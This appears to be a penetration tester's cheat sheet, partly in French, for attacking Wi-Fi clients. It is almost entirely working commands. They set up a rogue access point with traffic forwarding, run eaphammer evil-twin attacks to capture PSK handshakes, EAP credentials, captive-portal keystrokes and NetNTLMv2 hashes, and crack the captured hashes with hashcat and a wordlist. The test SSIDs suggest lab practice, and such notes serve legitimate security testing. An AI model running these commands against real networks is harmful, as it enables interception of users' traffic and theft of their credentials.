# Wi-Fi

## Sniffer le traffic

**Setup**
```bash
iwconfig
ip addr add 10.0.0.1/24 dev wlan0

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

```bash
dnsmasq --interface=wlan0 --dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h --no-daemon
```

**Open**
```bash
sudo ./eaphammer -i wlan0 -e testopen --auth open
```

**PSK**
```bash
sudo ./eaphammer -i wlan0 -e testpsk --auth wpa-psk --wpa-passphrase Password123!
```
Une fois connecté avec le client tester en se rendant sur ce site : http://zero.webappsecurity.com/login.html

## Stealing credentials

**PSK**
```bash
sudo ./eaphammer  -i wlan0 -e testpsk --auth wpa-psk
```

```bash
hcxhash2cap --hccapx=loot/file.hccapx -c capture.pcap
hcxpcapngtool capture.pcap -o capture.hc22000
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
```

**EAP**
```bash
sudo ./eaphammer --cert-wizard  
sudo ./eaphammer -i wlan0 -e testeap --auth wpa-eap --creds
```

**Captive portal**
```bash
sudo ./eaphammer -i wlan0 -e captive-portal --auth open --captive-portal

./core/wskeyloggerd/templates/user_defined/
sudo ./eaphammer --list-templates
sudo ./eaphammer --delete-template --name nom_template
```

**Hostile portal (Responder - NetNTLMv2)**
```bash
sudo ./eaphammer -i wlan0 -e hostile-portal --auth open --hostile-portal
```
## PMKID Attacks
https://github.com/s0lst1c3/eaphammer/wiki/XII.-PMKID-Attacks-Against-WPA-PSK-and-WPA2-PSK-Networks

## PSK attacks
https://github.com/v1s1t0r1sh3r3/airgeddon